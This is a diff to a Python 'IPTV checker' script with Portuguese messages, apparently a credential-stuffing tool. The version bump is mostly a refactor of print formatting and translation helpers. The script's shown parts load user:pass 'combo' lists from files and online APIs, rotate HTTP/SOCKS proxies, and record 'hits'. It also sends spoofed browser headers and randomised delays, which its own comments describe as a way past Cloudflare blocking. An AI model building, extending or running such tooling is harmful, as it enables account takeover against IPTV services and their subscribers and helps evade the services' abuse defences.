@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-DEEPSEEK IPTV CHECKER VERSION - 6 REV - 4
+DEEPSEEK IPTV CHECKER VERSION - 6 REV - 5
 ESSA SCRIPT NÃO FUNCIONA SEM OS SUBS 
 ARQUIVOS DENTRO DA PASTA DS ULTRA V6 !
 PY CONFIG BY Thomas R., Telegram: @ReyFxck
@@ -28,7 +28,6 @@ PROIBIDO A VENDA DESTE SCRIPT!
 C o d e d - B y - T h o m a s - N o o b S o f r e !
 """
 
-# importar bibliotecas padrão
 import os
 import sys
 import json
@@ -37,8 +36,8 @@ import random
 import threading
 import traceback
 from datetime import datetime
+from Utils.translate import criar_t, selecionar_idioma, listar_idiomas_disponiveis
 
-# Cores para melhorar a visualização
 class cor:
     white_n = "\033[0;1m"
     vermelho = "\033[91m"
@@ -54,11 +53,10 @@ class cor:
     fail = "\033[1;38;5;9m"
     atention = "\033[1;38;5;227m"
 
-# Verifica se as bibliotecas estão instaladas
 try:
     import requests
 except ImportError:
-    print(f"{cor.vermelho}A biblioteca 'requests' não está instalada. Instale-a com o comando abaixo:{cor.reset}")
+    print("{}A biblioteca 'requests' não está instalada. Instale-a com o comando abaixo:{}".format(cor.vermelho, cor.reset))
     print("pip install requests")
     exit()
 
@@ -66,27 +64,23 @@ try:
     import socks
     from requests.packages.urllib3.contrib.socks import SOCKSProxyManager
 except ImportError:
-    print(f"{cor.vermelho}A biblioteca 'requests[socks]' não está instalada. Instale-a com o comando abaixo:{cor.reset}")
+    print("{}A biblioteca 'requests[socks]' não está instalada. Instale-a com o comando abaixo:{}".format(cor.vermelho, cor.reset))
     print("pip install requests[socks]")
     exit()
 
 try:
     from tabulate import tabulate
 except ImportError:
-    print(f"{cor.vermelho}A biblioteca 'tabulate' não está instalada. Instale-a com o comando abaixo:{cor.reset}")
+    print("{}A biblioteca 'tabulate' não está instalada. Instale-a com o comando abaixo:{}".format(cor.vermelho, cor.reset))
     print("pip install tabulate")
     exit()
 
-# ======================================
-# CONSTANTES E CONFIGURAÇÕES GLOBAIS
-# ======================================
 CONFIG_FILE = "config.json"
-LANG_DIR = "Language"
 PROXY_API_FILE = "proxy_api.json"
 COMBO_API_FILE = "combo_api.json"
-# Carrega as APIs no início
+
 def carregar_proxy_apis():
-    """Carrega as APIs de proxy do arquivo JSON"""
+    """Carrega as APIs de proxy do arquivo JSON ou retorna padrões."""
     defaults = {
         "ProxyScrape": {
             "url": "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
@@ -125,26 +119,12 @@ def carregar_combo_apis():
 COMBO_APIS = carregar_combo_apis()
 
 def clear():
+    """Limpa a tela do terminal."""
     os.system('cls' if os.name == 'nt' else 'clear')
 
 
-def criar_t(config):
-    """Retorna uma função t() que já tem acesso ao config"""
-    def t(key, default=None):
-        keys = key.split('.')
-        current = carregar_idioma(config["idioma"]).get("translations", {})
-        
-        try:
-            for k in keys:
-                current = current[k]
-            return current
-        except (KeyError, TypeError):
-            return default if default is not None else key
-    return t
-
-
 def carregar_configuracoes():
-    """Carrega ou cria arquivo de configuração"""
+    """Carrega as configurações do arquivo JSON ou cria com valores padrão."""
     defaults = {
         "sistema_operacional": None,
         "idioma": None,
@@ -188,8 +168,7 @@ def carregar_configuracoes():
         try:
             with open(CONFIG_FILE, "r") as f:
                 dados = json.load(f)
-                
-                # Sua lógica original de migração, que é importante e deve ser mantida.
+
                 if isinstance(dados.get("sistema_operacional"), dict):
                     config = {
                         "sistema_operacional": dados["sistema_operacional"].get("sistema_operacional"),
@@ -209,13 +188,10 @@ def carregar_configuracoes():
                 else:
                     config = {**defaults, **dados}
 
-                # Suas verificações originais, que também devem ser mantidas.
                 config["hit_settings"] = {**defaults["hit_settings"], **dados.get("hit_settings", {})}
-                
-                # CORREÇÃO PRINCIPAL: Garante que o dicionário category_settings seja criado se não existir
+
                 config["category_settings"] = {**defaults["category_settings"], **config.get("category_settings", {})}
 
-                # Verificações de compatibilidade
                 if "banner_color" not in config:
                     config["banner_color"] = "90m"
                 if "request_timeout" not in config:
@@ -234,31 +210,25 @@ def carregar_configuracoes():
                     config["pausar_429"] = defaults["pausar_429"]
                 if "pausar_403" not in config:
                     config["pausar_403"] = defaults["pausar_403"]
-                
-                # CORREÇÃO CRÍTICA: Migração de configurações antigas APENAS UMA VEZ
+
                 migrou_configuracoes = False
-                
-                # Migra categoria_tipo para category_settings.layout_style (APENAS se ainda não foi migrado)
+
                 if "categoria_tipo" in config and "layout_style" not in config.get("category_settings", {}):
                     config["category_settings"]["layout_style"] = config["categoria_tipo"]
                     migrou_configuracoes = True
-                
-                # Migra usar_separadores_categoria para category_settings.use_type_headers
+
                 if "usar_separadores_categoria" in config and "use_type_headers" not in config.get("category_settings", {}):
                     config["category_settings"]["use_type_headers"] = config["usar_separadores_categoria"]
                     migrou_configuracoes = True
-                
-                # Remove as chaves antigas APÓS a migração para evitar conflitos futuros
+
                 if migrou_configuracoes:
                     config.pop("categoria_tipo", None)
                     config.pop("usar_separadores_categoria", None)
-                    
-                    # Salva imediatamente após a migração para evitar re-migração
+
                     with open(CONFIG_FILE, "w") as f:
                         json.dump(config, f, indent=4)
-                    print(f"{cor.verde}[INFO] Configurações de categoria migradas com sucesso!{cor.reset}")
-                
-                # Limpa chaves obsoletas de testes anteriores para manter o config.json limpo.
+                    print("{}[INFO] Configurações de categoria migradas com sucesso!{}".format(cor.verde, cor.reset))
+
                 if "separator_style" in config.get("category_settings", {}):
                     del config["category_settings"]["separator_style"]
                 if "show_category_count" in config.get("category_settings", {}):
@@ -266,22 +236,22 @@ def carregar_configuracoes():
 
                 return config
         except Exception as e:
-            print(f"{cor.vermelho}Erro ao carregar configurações: {e}{cor.reset}")
+            print("{}Erro ao carregar configurações: {}{}".format(cor.vermelho, e, cor.reset))
             return defaults
     return defaults
 
 
 def salvar_configuracao(config):
-    """Salva configurações no arquivo JSON."""
+    """Salva as configurações atuais no arquivo JSON."""
     with open(CONFIG_FILE, "w") as f:
         json.dump(config, f, indent=4)
 
 
-# Banner de decoração (normal em projetos)
 def banner(config, t):
+    """Exibe o banner do script no terminal."""
     clear()
     translated_by = t('traduce.traduce_json', default="Json não carregado")
-    print(f"""{cor.c_azul}
+    print("""{}
         ⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣤⣶⣶⣶⠶⠀⠀⠀⠀⣰⣿⣄            
         ⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⣷⣦⡀⢀⣀⣀⣠⣴⣿          
         ⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⢹⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⡿         
@@ -294,88 +264,59 @@ def banner(config, t):
         ⠀⠹⣿⣿⣿⣷⣄⠀⠀⠀⠀⣴⣦⣄⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⠋        
         ⠀⠀⠙⢿⣿⣿⣿⣷⣄⡀⠀⢿⣿⣿⣿⣦⣄⠀⠙⢿⣿⣿⣿⣿⣿⣤⣀        
         ⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣽⡿⢿⣿⣿⣿⣿⡿        
-        ⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀{cor.reset}
-{cor.c_purple}\n            DEEPSEEK IPTV CHECKER BY @ReyFxck
+        ⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀{}
+{}\n            DEEPSEEK IPTV CHECKER BY @ReyFxck
             GitHub https://github.com/ReyFxck
-            Script Python, Version: 6 Rev: 04\n{cor.reset}
-            Translated by: {translated_by}{cor.reset}""")
-
-# ==============================================
-# GERENCIAMENTO DE IDIOMAS
-# ==============================================
-def carregar_idioma(idioma):
-    """Carrega traduções do arquivo de idioma"""
-    lang_file = f"lang-{idioma}.json" if idioma != "default" else "lang.json"
-    
-    base_dir = os.path.dirname(os.path.abspath(__file__))
-    lang_path = os.path.join(base_dir, LANG_DIR, lang_file)
-
-    # Fallback para inglês se o arquivo não existir
-    if not os.path.exists(lang_path):
-        lang_path = os.path.join(base_dir, LANG_DIR, "lang-en.json")
-        if not os.path.exists(lang_path):
-            return {"translations": {}}
-    
-    try:
-        with open(lang_path, "r", encoding="utf-8") as f:
-            return json.load(f)
-    except:
-        return {"translations": {}}
-
-def listar_idiomas_disponiveis():
-    """Retorna lista de idiomas disponíveis na pasta lang/"""
-    if not os.path.exists(LANG_DIR):
-        os.makedirs(LANG_DIR)
-        return []
-    
-    idiomas = []
-    for arquivo in os.listdir(LANG_DIR):
-        if arquivo.startswith("lang-") and arquivo.endswith(".json"):
-            idiomas.append(arquivo[5:-5])  # Remove 'lang-' e '.json'
-    return idiomas
+            Script Python, Version: 6 Rev: 05\n{}
+            Translated by: {}{}""".format(cor.c_azul, cor.reset, cor.c_purple, cor.reset, translated_by, cor.reset))
 
 
 def configurar_hit_settings(config, t):
     """Menu para configurar o que aparece no arquivo de hits"""
     while True:
         banner(config, t)
-        print(f"\n{cor.ciano}  === CONFIGURAR INFORMAÇÕES NO HIT ==={cor.reset}")
-        print(f"{cor.amarelo}  Selecione o item para ativar/desativar:{cor.reset}\n")
-        
-        # Lista todas as opções com status atual
+        print("\n{}  === CONFIGURAR INFORMAÇÕES NO HIT ==={}".format(cor.ciano, cor.reset))
+        print("{}  Selecione o item para ativar/desativar:{}\n".format(cor.amarelo, cor.reset))
+
         settings = config["hit_settings"]
         for i, (key, value) in enumerate(settings.items(), 1):
             status = f"{cor.verde}ON{cor.reset}" if value else f"{cor.vermelho}OFF{cor.reset}"
-            print(f"{cor.azul}  {i}. {key.ljust(12)}: [{status}]")
+            print("{}  {}. {}: [{}".format(cor.azul, i, key.ljust(12), status))
         
-        print(f"\n{cor.ciano}  {len(settings)+1}. Voltar{cor.reset}")
-        print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
+        print("\n{}  {}. Voltar{}".format(cor.ciano, len(settings)+1, cor.reset))
+        print("{}{}{}  \n".format(cor.ciano, "=" * 26, cor.reset))
         
         try:
-            escolha = int(input(f"{cor.verde}>> {cor.reset}")) - 1
+            escolha = int(input("{}  {} >>> {}".format(
+                cor.verde,
+                t('responses.response'),
+                cor.reset
+            ))) - 1
             if escolha == len(settings):
-                return  # Voltar
+                return
             elif 0 <= escolha < len(settings):
                 key = list(settings.keys())[escolha]
-                # Pergunta se quer ligar/desligar
-                print(f"\n{cor.ciano}  {key} | DESEJA LIGAR/DESLIGAR?{cor.reset}")
-                print(f"{cor.azul}  [1] LIGADO{cor.reset}")
-                print(f"{cor.azul}  [2] DESLIGADO{cor.reset}")
-                opcao = input(f"{cor.verde}>> {cor.reset}")
+
+                print("\n{}  {} | DESEJA LIGAR/DESLIGAR?{}".format(cor.ciano, key, cor.reset))
+                print("{}  [1] LIGADO{}".format(cor.azul, cor.reset))
+                print("{}  [2] DESLIGADO{}".format(cor.azul, cor.reset))
+                opcao = input("{}  {} >>> {}".format(
+                    cor.verde,
+                    t('responses.response'),
+                    cor.reset
+                )).strip()
                 if opcao == "1":
                     settings[key] = True
                 elif opcao == "2":
                     settings[key] = False
                 salvar_configuracao(config)
         except ValueError:
-            print(f"{cor.vermelho}Opção inválida!{cor.reset}")
+            print("{}Opção inválida!{}".format(cor.vermelho, cor.reset))
 
-# Função para escolher o sistema operacional
 def escolher_sistema_operacional(config, t=None):
-    """Mostra opções de SO com tradução e confirma o caminho"""
+    """Permite ao usuário escolher o sistema operacional e define o caminho base para as pastas de saída."""
     banner(config, t)
-    
-    # Dicionário FIXO de mapeamento
+
     SISTEMAS_PADRONIZADOS = {
         "1": "Android",
         "2": "Windows", 
@@ -383,8 +324,7 @@ def escolher_sistema_operacional(config, t=None):
         "4": "macOS",
         "5": "iOS"
     }
-    
-    # Textos traduzidos (com fallback)
+
     if t:
         titulo = ('  Escolha o sistema operacional:')
         ajuda = ('Isso define onde as pastas serão criadas:')
@@ -406,37 +346,37 @@ def escolher_sistema_operacional(config, t=None):
         erro_msg = "Opção inválida!"
         confirmacao = "Caminho que será usado:"
 
-    print(f"{cor.ciano}{titulo}{cor.reset}")
-    print(f"\n{cor.amarelo}[?] {ajuda}{cor.reset}\n")
-    
-    # Mostra menu
+    print("{}{}{}".format(cor.ciano, titulo, cor.reset))
+    print("\n{}[?] {}{}".format(cor.amarelo, ajuda, cor.reset))
+
     for num, nome in opcoes_texto.items():
-        print(f"{cor.azul}{num}. {nome}{cor.reset}")
-    
-    # Validação
+        print("{}{}. {}{}".format(cor.azul, num, nome, cor.reset))
+
     while True:
-        escolha = input(f"{cor.verde} {prompt} {cor.reset}").strip()
+        escolha = input("{}  {} >>> {}".format(
+            cor.verde,
+            t('responses.response'),
+            cor.reset
+        )).strip()
         
         if escolha in SISTEMAS_PADRONIZADOS:
             sistema_escolhido = SISTEMAS_PADRONIZADOS[escolha]
             caminho = determinar_caminho_base(sistema_escolhido)
-            
-            # NOVO: Mostra confirmação do caminho
-            print(f"\n{cor.verde}✓ {confirmacao}{cor.reset}")
-            print(f"{cor.ciano}{caminho if caminho else 'Não suportado!'}{cor.reset}\n")
+
+            print("\n{}✓ {}{}".format(cor.verde, confirmacao, cor.reset))
+            print("{}{}{}".format(cor.ciano, caminho if caminho else 'Não suportado!', cor.reset))
             
             if caminho:
                 return sistema_escolhido
             else:
-                print(f"{cor.vermelho}Sistema não suportado! Escolha novamente.{cor.reset}")
+                print("{}Sistema não suportado! Escolha novamente.{}".format(cor.vermelho, cor.reset))
         else:
-            print(f"{cor.vermelho}{erro_msg}{cor.reset}")
+            print("{}{}{}".format(cor.vermelho, erro_msg, cor.reset))
 
-# Função para determinar o caminho base com base no sistema operacional
 def determinar_caminho_base(sistema_operacional):
     try:
         caminhos = {
-            "Android": "/sdcard/",  # Caminho padrão no Android
+            "Android": "/sdcard/",
             "Windows": os.path.join(os.environ["USERPROFILE"], "Documents"),
             "Linux": os.path.join(os.environ.get("HOME", "/"), "Documents"),
             "macOS": os.path.join(os.environ.get("HOME", "/"), "Documents"),
@@ -444,43 +384,46 @@ def determinar_caminho_base(sistema_operacional):
         }
         return caminhos.get(sistema_operacional, None)
     except KeyError:
-        # Fallback para Android ou outros sistemas se houver erro
+
         return "/sdcard/" if sistema_operacional == "Android" else None
 
-# Função para limpar o host (remover http://, https://, barras e espaços)
 def limpar_host(host):
-    host = host.replace("http://", "").replace("https://", "")  # Remove protocolos
-    host = host.split("/")[0]  # Remove barras no final
-    host = host.strip()  # Remove espaços em branco
+    host = host.replace("http://", "").replace("https://", "")
+    host = host.split("/")[0]
+    host = host.strip()
     return host
 
 
 def escolher_combo_api(config, t):
     """Mostra menu de APIs de combo e retorna lista de combos"""
     banner(config, t)
-    print(f"\n{cor.ciano}  === ONLINE COMBO API'S ==={cor.reset}")
-    print(f"{cor.atention}  Selecione a fonte de combos online:{cor.reset}\n")
+    print("\n{}  === ONLINE COMBO API'S ==={}".format(cor.ciano, cor.reset))
+    print("{}  Selecione a fonte de combos online:{}\n".format(cor.atention, cor.reset))
     
     for i, (nome, dados) in enumerate(COMBO_APIS.items(), 1):
         display = dados.get("display_name", nome)
-        print(f"{cor.azul}  {i}. {display}{cor.reset}")
+        print("{}  {}. {}{}".format(cor.azul, i, display, cor.reset))
     
-    print(f"\n{cor.ciano}  {len(COMBO_APIS)+1}. Voltar{cor.reset}")
-    print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
+    print("\n{}  {}. Voltar{}".format(cor.ciano, len(COMBO_APIS)+1, cor.reset))
+    print("{}{}{}  \n".format(cor.ciano, "=" * 26, cor.reset))
     
     try:
-        escolha = int(input(f"{cor.verde}>> {cor.reset}")) - 1
+        escolha = int(input("{}  {} >>> {}".format(
+            cor.verde,
+            t('responses.response'),
+            cor.reset
+        ))) - 1
         if escolha == len(COMBO_APIS):
-            return None  # Voltar
+            return None
         
         if 0 <= escolha < len(COMBO_APIS):
             nome_api = list(COMBO_APIS.keys())[escolha]
             api = COMBO_APIS[nome_api]
             
-            print(f"\n{cor.verde}  Obtendo combos de {api.get("display_name", nome_api)}...{cor.reset}")
+            print("\n{}  Obtendo combos de {}...{}".format(cor.verde, api.get("display_name", nome_api), cor.reset))
             
             try:
-                # Headers mais realistas para contornar Cloudflare
+
                 headers = {
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
@@ -495,7 +438,7 @@ def escolher_combo_api(config, t):
                     'Sec-Fetch-User': '?1',
                     'Cache-Control': 'max-age=0'
                 }
-                # Mescla com headers específicos da API, se houver
+
                 headers.update(api.get("headers", {}))
 
                 tentativas = config.get("tentativas_sem_proxy", 2)
@@ -503,14 +446,14 @@ def escolher_combo_api(config, t):
                 
                 for tentativa in range(tentativas):
                     try:
-                        # Adiciona um delay entre tentativas para parecer mais humano
+
                         if tentativa > 0:
                             time.sleep(random.uniform(2, 5))
 
                         response = requests.get(api["url"], headers=headers, timeout=timeout, allow_redirects=True)
                         
                         if response.status_code == 200:
-                            # Tenta primeiro como texto simples (formato user:pass)
+
                             linhas = response.text.strip().split('\n')
                             combos = []
                             for linha in linhas:
@@ -520,10 +463,10 @@ def escolher_combo_api(config, t):
                                     combos.append((parts[0], parts[1]))
                             
                             if combos:
-                                print(f"{cor.verde}  {len(combos)} combos obtidos com sucesso!{cor.reset}")
+                                print("{}  {} combos obtidos com sucesso!{}".format(cor.verde, len(combos), cor.reset))
                                 return combos
                             else:
-                                # Se não encontrou combos no formato texto, tenta JSON
+
                                 try:
                                     data = response.json()
                                     combos = []
@@ -548,70 +491,72 @@ def escolher_combo_api(config, t):
                                                             combos.append((parts[0], parts[1]))
                                     
                                     if combos:
-                                        print(f"{cor.verde}  {len(combos)} combos obtidos com sucesso!{cor.reset}")
+                                        print("{}  {} combos obtidos com sucesso!{}".format(cor.verde, len(combos), cor.reset))
                                         return combos
                                 except json.JSONDecodeError:
-                                    pass # Não é JSON, continua para o próximo formato ou falha
+                                    pass
                                     
                         elif response.status_code == 403:
-                            print(f"{cor.vermelho}  Erro 403: Cloudflare bloqueou o acesso (tentativa {tentativa + 1}/{tentativas}){cor.reset}")
+                            print("{}  Erro 403: Cloudflare bloqueou o acesso (tentativa {}/{}){}".format(cor.vermelho, tentativa + 1, tentativas, cor.reset))
                         elif response.status_code == 429:
-                            print(f"{cor.amarelo}  Rate limit (429): Aguardando antes da próxima tentativa...{cor.reset}")
-                            time.sleep(10) # Espera mais tempo para rate limit
+                            print("{}  Rate limit (429): Aguardando antes da próxima tentativa...{}".format(cor.amarelo, cor.reset))
+                            time.sleep(10)
                         else:
-                            print(f"{cor.vermelho}  Erro HTTP {response.status_code} (tentativa {tentativa + 1}/{tentativas}){cor.reset}")
+                            print("{}  Erro HTTP {} (tentativa {}/{}){}".format(cor.vermelho, response.status_code, tentativa + 1, tentativas, cor.reset))
                             
                     except requests.exceptions.Timeout:
-                        print(f"{cor.vermelho}Timeout ao carregar combo da API (tentativa {tentativa + 1}/{tentativas}){cor.reset}")
+                        print("{}Timeout ao carregar combo da API (tentativa {}/{}){}".format(cor.vermelho, tentativa + 1, tentativas, cor.reset))
                     except requests.exceptions.ConnectionError:
-                        print(f"{cor.vermelho}Erro de conexão ao carregar combo da API (tentativa {tentativa + 1}/{tentativas}){cor.reset}")
+                        print("{}Erro de conexão ao carregar combo da API (tentativa {}/{}){}".format(cor.vermelho, tentativa + 1, tentativas, cor.reset))
                     except Exception as e:
-                        print(f"{cor.vermelho}Erro ao carregar combo da API: {e} (tentativa {tentativa + 1}/{tentativas}){cor.reset}")
-                    
-                    # Delay maior entre tentativas quando há erro 403 ou outros erros de rede
+                        print("{}Erro ao carregar combo da API: {} (tentativa {}/{}){}".format(cor.vermelho, e, tentativa + 1, tentativas, cor.reset))
+
                     if tentativa < tentativas - 1:
                         time.sleep(random.uniform(3, 8))
                 
-                print(f"{cor.vermelho}  Falha ao obter combos após {tentativas} tentativas{cor.reset}")
+                print("{}  Falha ao obter combos após {} tentativas{}".format(cor.vermelho, tentativas, cor.reset))
                 return None
                 
             except Exception as e:
-                print(f"{cor.vermelho}  Erro ao acessar API: {str(e)}{cor.reset}")
+                print("{}  Erro ao acessar API: {}{}".format(cor.vermelho, str(e), cor.reset))
                 return None
     except ValueError:
-        print(f"{cor.vermelho}  Opção inválida!{cor.reset}")
+        print("{}  Opção inválida!{}".format(cor.vermelho, cor.reset))
         return None
 
 
 def escolher_proxy_api(config, t):
     """Mostra menu de APIs de proxy e retorna (proxies, tipo_proxy)"""
     banner(config, t)
-    print(f"\n{cor.ciano}  === ONLINE PROXY API'S ==={cor.reset}")
-    print(f"{cor.atention}  Selecione a fonte de proxies online:{cor.reset}\n")
+    print("\n{}  === ONLINE PROXY API'S ==={}".format(cor.ciano, cor.reset))
+    print("{}  Selecione a fonte de proxies online:{}\n".format(cor.atention, cor.reset))
     
     for i, (nome, dados) in enumerate(PROXY_APIS.items(), 1):
-        # Usa display_name se existir, senão cria automaticamente
+
         display = dados.get('display_name', 
                           f"{nome.split()[0]} ({'HTTP' if dados['type'] == 1 else 'SOCKS4' if dados['type'] == 2 else 'SOCKS5'})")
-        print(f"{cor.azul}  {i}. {display}{cor.reset}")
+        print("{}  {}. {}{}".format(cor.azul, i, display, cor.reset))
     
-    print(f"\n{cor.ciano}  {len(PROXY_APIS)+1}. Voltar{cor.reset}")
-    print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
+    print("\n{}  {}. Voltar{}".format(cor.ciano, len(PROXY_APIS)+1, cor.reset))
+    print("{}{}{}  \n".format(cor.ciano, "=" * 26, cor.reset))
     
     try:
-        escolha = int(input(f"{cor.verde}>> {cor.reset}")) - 1
+        escolha = int(input("{}  {} >>> {}".format(
+            cor.verde,
+            t('responses.response'),
+            cor.reset
+        ))) - 1
         if escolha == len(PROXY_APIS):
-            return None  # Voltar
+            return None
         
         if 0 <= escolha < len(PROXY_APIS):
             nome_api = list(PROXY_APIS.keys())[escolha]
             api = PROXY_APIS[nome_api]
             
-            print(f"\n{cor.verde}  Obtendo proxies de {api.get("display_name", nome_api)}...{cor.reset}")
-            
-            # Adicionando tentativas e tratamento de erros para proxies online
-            tentativas = config.get("tentativas_sem_proxy", 2) # Usando a mesma config de tentativas
-            timeout = config.get("timeout_sem_proxy", 10) # Usando a mesma config de timeout
+            print("\n{}  Obtendo proxies de {}...{}".format(cor.verde, api.get("display_name", nome_api), cor.reset))
+
+            tentativas = config.get("tentativas_sem_proxy", 2)
+            timeout = config.get("timeout_sem_proxy", 10)
 
             for tentativa in range(tentativas):
                 try:
@@ -625,69 +570,71 @@ def escolher_proxy_api(config, t):
                             proxies = [p.replace("http://", "").replace("socks4://", "").replace("socks5://", "") for p in proxies]
                         
                         if proxies:
-                            print(f"{cor.verde}  {len(proxies)} proxies obtidos com sucesso!{cor.reset}")
+                            print("{}  {} proxies obtidos com sucesso!{}".format(cor.verde, len(proxies), cor.reset))
                             return proxies, api["type"]
                         else:
-                            print(f"{cor.amarelo}  Nenhum proxy encontrado na API (tentativa {tentativa + 1}/{tentativas}){cor.reset}")
+                            print("{}  Nenhum proxy encontrado na API (tentativa {}/{}){}".format(cor.amarelo, tentativa + 1, tentativas, cor.reset))
                     elif response.status_code == 403:
-                        print(f"{cor.vermelho}  Erro 403: Cloudflare bloqueou o acesso ao proxy (tentativa {tentativa + 1}/{tentativas}){cor.reset}")
+                        print("{}  Erro 403: Cloudflare bloqueou o acesso ao proxy (tentativa {}/{}){}".format(cor.vermelho, tentativa + 1, tentativas, cor.reset))
                     elif response.status_code == 429:
-                        print(f"{cor.amarelo}  Rate limit (429) para proxy: Aguardando antes da próxima tentativa...{cor.reset}")
+                        print("{}  Rate limit (429) para proxy: Aguardando antes da próxima tentativa...{}".format(cor.amarelo, cor.reset))
                         time.sleep(10)
                     else:
-                        print(f"{cor.vermelho}  Erro HTTP {response.status_code} ao acessar proxy (tentativa {tentativa + 1}/{tentativas}){cor.reset}")
+                        print("{}  Erro HTTP {} ao acessar proxy (tentativa {}/{}){}".format(cor.vermelho, response.status_code, tentativa + 1, tentativas, cor.reset))
                         
                 except requests.exceptions.Timeout:
-                    print(f"{cor.vermelho}Timeout ao carregar proxy da API (tentativa {tentativa + 1}/{tentativas}){cor.reset}")
+                    print("{}Timeout ao carregar proxy da API (tentativa {}/{}){}".format(cor.vermelho, tentativa + 1, tentativas, cor.reset))
                 except requests.exceptions.ConnectionError:
-                    print(f"{cor.vermelho}Erro de conexão ao carregar proxy da API (tentativa {tentativa + 1}/{tentativas}){cor.reset}")
+                    print("{}Erro de conexão ao carregar proxy da API (tentativa {}/{}){}".format(cor.vermelho, tentativa + 1, tentativas, cor.reset))
                 except Exception as e:
-                    print(f"{cor.vermelho}Erro ao carregar proxy da API: {e} (tentativa {tentativa + 1}/{tentativas}){cor.reset}")
+                    print("{}Erro ao carregar proxy da API: {} (tentativa {}/{}){}".format(cor.vermelho, e, tentativa + 1, tentativas, cor.reset))
                 
                 if tentativa < tentativas - 1:
-                    time.sleep(random.uniform(3, 8)) # Delay entre tentativas
+                    time.sleep(random.uniform(3, 8))
             
-            print(f"{cor.vermelho}  Falha ao obter proxies após {tentativas} tentativas{cor.reset}")
+            print("{}  Falha ao obter proxies após {} tentativas{}".format(cor.vermelho, tentativas, cor.reset))
             return None
                 
     except ValueError:
-        print(f"{cor.vermelho}  Opção inválida!{cor.reset}")
+        print("{}  Opção inválida!{}".format(cor.vermelho, cor.reset))
         return None
 
 
-# Função para listar arquivos em uma pasta e permitir a escolha pelo número
 def escolher_arquivo(pasta, t, tipo="combo", config=None):
     if not os.path.exists(pasta):
-        print(f"{cor.amarelo}  {t('responses.creating_folder_combo', 'Criando pasta:')} {pasta}{cor.reset}")
+        print("{}  {} {}{}".format(cor.amarelo, t('responses.creating_folder_combo', 'Criando pasta:'), pasta, cor.reset))
         os.makedirs(pasta)
         return None
         
     arquivos = [f for f in os.listdir(pasta) if f.endswith('.txt')]
     
-    print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
+    print("\n  {}{}{}".format(cor.ciano, "=" * 26, cor.reset))
     if tipo == "combo":
-        print(f"{cor.atention}  {t('questions.select_combo_file')}{cor.reset}")
+        print("{}  {}{}".format(cor.atention, t('questions.select_combo_file'), cor.reset))
     else:
-        print(f"{cor.atention}  {t('questions.select_proxy_file')}{cor.reset}")
+        print("{}  {}{}".format(cor.atention, t('questions.select_proxy_file'), cor.reset))
     
     if tipo == "combo":
-        print(f"{cor.magenta}  [0] ONLINE COMBO API'S{cor.reset}")
-    # Adiciona opção para Proxy Online se for seleção de proxy
+        print("{}  [0] ONLINE COMBO API'S{}".format(cor.magenta, cor.reset))
+
     elif tipo != "combo":
-         print(f"{cor.magenta}  [0] ONLINE PROXY API'S{cor.reset}")
+         print("{}  [0] ONLINE PROXY API'S{}".format(cor.magenta, cor.reset))
     
     for i, arquivo in enumerate(arquivos, 1):
-        print(f"{cor.azul}  {i}. {arquivo}{cor.reset}")
+        print("{}  {}. {}{}".format(cor.azul, i, arquivo, cor.reset))
         
-    print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
+    print("  {}{}{}\n".format(cor.ciano, "=" * 26, cor.reset))
     
     try:
-        escolha = input(f"\n  {cor.verde}{t('responses.response')} >>> {cor.reset}").strip()
-        
-        # Se for 0 e for seleção de combo, mostrar menu de APIs de combo
+        escolha = input("\n  {}{} >>> {}".format(
+            cor.verde,
+            t('responses.response'),
+            cor.reset
+        )).strip()
+
         if escolha == "0" and tipo == "combo":
             return escolher_combo_api(config, t)
-        # Se for 0 e for seleção de proxy, mostrar menu de APIs de proxy
+
         elif escolha == "0" and tipo != "combo":
             return escolher_proxy_api(config, t)
             
@@ -695,26 +642,25 @@ def escolher_arquivo(pasta, t, tipo="combo", config=None):
         if 0 <= escolha < len(arquivos):
             return os.path.join(pasta, arquivos[escolha])
         else:
-            print(f"{cor.vermelho}\n  {t('responses.invalid_choice')}{cor.reset}")
+            print("{}\n  {}{}".format(cor.vermelho, t('responses.invalid_choice'), cor.reset))
             return None
     except ValueError:
-        print(f"{cor.vermelho}\n  {t('responses.invalid_input')}{cor.reset}")
+        print("{}\n  {}{}".format(cor.vermelho, t('responses.invalid_input'), cor.reset))
         return None
 
 
-# Função para configurar o tipo de proxy
 def configurar_proxy(tipo, proxy, formato_paga=None):
     """Formata proxy com base no tipo e no formato de autenticação"""
     try:
-        if formato_paga == "1":  # hostname:port:username:password
+        if formato_paga == "1":
             host, port, user, pwd = proxy.split(":")
             proxy_auth = f"{user}:{pwd}@{host}:{port}"
-        elif formato_paga == "2":  # username:password@hostname:port
+        elif formato_paga == "2":
             proxy_auth = proxy
-        elif formato_paga == "3":  # http://username:password@hostname:port
+        elif formato_paga == "3":
             proxy_auth = proxy.replace("http://", "")
         else:
-            proxy_auth = proxy  # proxy grátis
+            proxy_auth = proxy
 
         if tipo == 1:
             return {
@@ -738,10 +684,9 @@ def configurar_proxy(tipo, proxy, formato_paga=None):
         else:
             return None
     except Exception as e:
-        print(f"{cor.vermelho}[ERRO CONFIG PROXY] {e}{cor.reset}")
